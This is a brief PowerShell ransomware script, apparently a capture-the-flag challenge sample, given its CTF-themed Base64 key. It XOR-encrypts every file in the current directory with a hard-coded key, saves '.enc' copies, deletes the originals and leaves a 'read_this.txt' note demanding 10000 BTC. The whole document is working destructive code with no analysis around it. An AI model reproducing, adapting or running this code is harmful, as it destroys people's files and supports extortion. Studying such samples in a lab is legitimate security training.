$password = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("SGFDZUVzMjAyM0NURiwgQXBha2FoIEd1ZD8="))

function XorEncrypt($data, $key) {
    $encryptedData = [byte[]]::new($data.Length)
    for ($i = 0; $i -lt $data.Length; $i++) {
        $encryptedData[$i] = $data[$i] -bxor $key[$i % $key.Length]
    }
    return $encryptedData
}

$imageFiles = Get-ChildItem -Path . -File

foreach ($imageFile in $imageFiles) {
    $filePath = $imageFile.FullName
    $imageData = [System.IO.File]::ReadAllBytes($filePath)

    $encryptedData = XorEncrypt $imageData $password

    $encryptedFilePath = $filePath + ".enc"
    [System.IO.File]::WriteAllBytes($encryptedFilePath, $encryptedData)

    Remove-Item $filePath

    $textFilePath = [System.IO.Path]::Combine((Get-Location).Path, "read_this.txt")
    [System.IO.File]::WriteAllText($textFilePath, "Your files has been encrypted!!!, Send me 10000 BTC to unlock your files")
}